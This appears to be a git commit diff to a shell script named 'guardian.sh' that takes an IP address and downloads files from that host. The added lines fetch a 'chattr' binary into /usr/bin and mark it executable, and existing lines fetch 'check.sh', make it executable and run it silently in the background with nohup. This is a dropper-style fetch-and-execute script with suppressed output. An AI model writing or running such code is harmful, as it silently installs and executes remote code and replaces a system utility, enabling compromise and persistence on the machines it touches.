72d6d277528808e8953266f15158d8b928c199d9
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-05-26 12:10:08 +0100

    Update guardian.sh

--- guardian.sh
+++ guardian.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+#H3X-007 :)
 script_path="/home/.../check.sh"
 ip_address="$1"
 
@@ -7,9 +7,15 @@ if [ -z "$ip_address" ]; then
     exit 1
 fi
 
+chattr_path="/usr/bin/chattr"
+
+if [ ! -f "$chattr_path" ]; then
+    wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
+    chmod +x "$chattr_path"
+fi
+
 if [ ! -f "$script_path" ]; then
     wget "http://$ip_address/check.sh" -O "$script_path" >/dev/null 2>&1
     chmod +x "$script_path"
     nohup "$script_path" >/dev/null 2>&1 &
-
 fi
